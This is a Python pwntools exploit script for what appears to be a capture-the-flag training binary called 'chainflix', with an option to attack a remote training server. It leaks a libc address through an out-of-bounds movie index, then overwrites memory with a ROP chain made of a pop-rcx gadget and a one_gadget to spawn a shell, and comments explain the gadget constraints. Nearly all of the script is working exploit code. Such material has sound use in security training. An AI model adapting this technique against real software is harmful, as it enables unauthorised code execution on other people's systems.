from pwn import *

if(len(sys.argv) > 1):
    if(sys.argv[1] == '--debug'):
        p = process("./chainflix")
        gdb.attach(p, """
        """ )
        input("wait...")
    elif(sys.argv[1] == '--strace'):
        p = process(["strace", "./chainflix"])
    elif(sys.argv[1] == '--remote'):
        p = remote("bin.training.offdef.it", 5003)
else:
    p = process("./chainflix")

def print_movie(idx):
    p.recvuntil(b"3. Exit\n")
    p.sendline(b'1')
    p.recvuntil(b"#> ")
    p.sendline(b"%d" % idx)
    p.recvuntil(b'Title: ')
    title = p.recvuntil(b'\n')[:-1]
    p.recvuntil(b'Year: ')
    year = p.recvuntil(b'\n')[:-1]
    p.recvuntil(b'Rating: ')
    rating = p.recvuntil(b'\n')[:-1]
    return title, year, rating

def add_movie(title, year, rating):
    p.recvuntil(b"3. Exit\n")
    p.sendline(b'2')
    p.recvuntil(b"Title: ")
    p.send(title)
    p.recvuntil(b"Year: ")
    p.sendline(year)
    p.recvuntil(b"Rating: ")
    p.sendline(rating)

def exit():
    p.recvuntil(b"3. Exit\n")
    p.sendline(b"3")

def msb_lsb(num):
    return (num & 0xffffffff00000000) >> 32, num & 0x00000000ffffffff

libc = ELF("./libc.so.6")
binary = ELF("./chainflix")

# bin_sh = next(libc.search(b"/bin/sh\x00"))
# system = libc.symbols.system

# Leak LIBC: index 17 lead to some libc leak
offset = 171584

libc_leak, y, r = print_movie(17)

# print(libc_leak, len(libc_leak))
libc.address = u64(libc_leak + b'\x00\x00') - offset


print("%#x" % libc.address)

# Exploit
one_gadget = 0x50a47 # 0x50a47 0xebc81 0xebc85 0xebc88, the first one has the following constraints:   (rsp & 0xf == 0) && (rcx == NULL) && (rbp == NULL || (u16)[rbp] == NULL)

# The only not satisfied constraint is the rcx == NULL, we can do a pop
pop_rcx = 0x000000000003d1ee

dummy_ret = 0x0000000000031884

for i in range(10):
    add_movie(b"A"*16, b"100000", b"100000")

msb, lsb = msb_lsb(0xdeadbeefdeadbeef)

print(hex(msb))
print(hex(lsb))

add_movie(b"\x00"*8 + p64(libc.address + pop_rcx), b"0", b"0")
add_movie(p64(libc.address + one_gadget) + b"A"*8, b"200000", b"200000")

exit()

p.interactive()